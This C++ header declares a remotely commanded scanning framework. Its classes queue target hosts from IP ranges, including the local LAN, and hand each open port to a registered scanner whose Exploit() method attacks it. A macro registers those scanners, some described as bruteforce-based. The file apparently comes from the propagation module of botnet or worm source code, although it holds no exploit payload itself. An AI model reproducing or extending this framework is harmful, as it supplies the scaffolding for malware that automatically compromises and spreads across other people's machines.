
#ifndef __SCANNER_H__
#define __SCANNER_H__

#include "cstring.h"
#include "commands.h"
#include "message.h"
#include "cthread.h"
#include "sockets.h"

class CNetRange;
class CPortScanner;
class CScanner;
class CScannerBase;

extern int volatile g_iNumScanThreads;

typedef CScannerBase* (*pfnNewScanner)();

class CNetRange
{
public:
	unsigned short		 iPart1, iPart2, iPart3, iPart4;
	unsigned short		 iNetMask;
	unsigned int		 iPriority;
	bool				 bSilent;
	bool				 bNotice;
	CString				 sReplyTo;
	CScanner			*pScanner;

	void				 operator=(const CNetRange &nRange);
	bool				 operator==(const CNetRange &nRange);
};

typedef struct ScannerInfo_s
{	pfnNewScanner		 pAllocator;		// Pointer to the allocator
	unsigned short		 sPort;				// The port to scan
	char				*szScannerName;		// The scanners name
	bool				 bEnabled;			// Is this scanner enabled ?
	int					 iPortHit;			// How often this port was found
	int volatile		*pScanStats;		// Pointer to the scan stats
	bool				 bInheritSocket;	// Inherit the socket ?
	bool				 bFastScan;			// Does this scanner complete
											// fast (ie. does it use bruteforce) ?
} ScannerInfo;

typedef struct TargetInfo_s
{	CString				 sHost;				// The host to scan
	unsigned short		 sPort;				// The port to scan
	CNetRange			 pNetRange;			// The netrange this came from
} TargetInfo;

typedef struct ConnectionInfo_s
{	CSocket				 m_sSocket;			// The socket connected
	TargetInfo			 m_pTargetInfo;		// The targetinfo structure
	unsigned long		 m_lStartupTime;	// The time the connection was initiated
} ConnectionInfo;
	
void RegisterScanner(ScannerInfo *pScanner);

class CPortScanner : public CThread
{
public:
						 CPortScanner();
	virtual				~CPortScanner();

	void				*Run();

	void				 RegisterNetRange(CNetRange *pNetRange);
	void				 RemoveNetRange(CNetRange *pNetRange);

	bool				 EnableScanner(const char *szName);
	bool				 DisableScanner(const char *szName);

	void				 AddLocalLAN();

	list<CNetRange>		 m_lNetRanges;
private:
	void				 StartScanners(const CString &sHost, const int &iPort);
	list<TargetInfo>	 m_lTargetQueue;
	ConnectionInfo		*m_sConnections;
	int					 m_iNumSockets;
};

class CScanner : public CCommandHandler
{
public:
	void				 Init();

	CPortScanner		 m_cPortScanner;

	bool				 HandleCommand(CMessage *pMsg);
	
	command				 m_cmdAddNetRange, m_cmdDelNetRange, m_cmdResetNetRanges, \
						 m_cmdListNetRanges, m_cmdClearNetRanges, \
						 m_cmdEnableScanner, m_cmdDisableScanner, \
						 m_cmdStart, m_cmdStop, m_cmdScanStartAll, m_cmdScanStopAll,
						 m_cmdStats;

	bool				 m_bScanning;
};

class CScannerBase : public CThread
{
public:
						 CScannerBase() : m_sSocket(true)
						 {	m_szType="CScannerBase"; m_sScannerName.Assign("Base"); }
	virtual				~CScannerBase() { }
	virtual void		*Run();

	virtual bool		 Exploit();

	void				 SendLocal(const char *szFormat, ...);

	CString				 m_sScannerName;
	CSocket				 m_sSocket;
	CNetRange			 m_pNetRange;
};

// Params: a=unique identifier, b=name, c=port, d=inherit socket, e=fastscan
#define REGSCANNER(a, b, c, d, e) \
	volatile int g_iStats##a; \
	CScannerBase *GetScanner_##a() { \
		CScannerBase *pScanner=(CScannerBase*)new CScanner##b; \
		pScanner->m_szType="CScanner"#b; \
		return pScanner; } \
	class CTempRegister_##a { public: \
		CTempRegister_##a() { \
			ScannerInfo iInfo; iInfo.bEnabled=false; \
			iInfo.pAllocator=&GetScanner_##a; \
			iInfo.sPort=c; iInfo.szScannerName=#b; \
			iInfo.pScanStats=&g_iStats##a; \
			iInfo.bFastScan=e; \
			iInfo.iPortHit=0; iInfo.bInheritSocket=d; \
			RegisterScanner(&iInfo); } }; \
	CTempRegister_##a g_cTempRegister_##a;

#endif // __SCANNER_H__
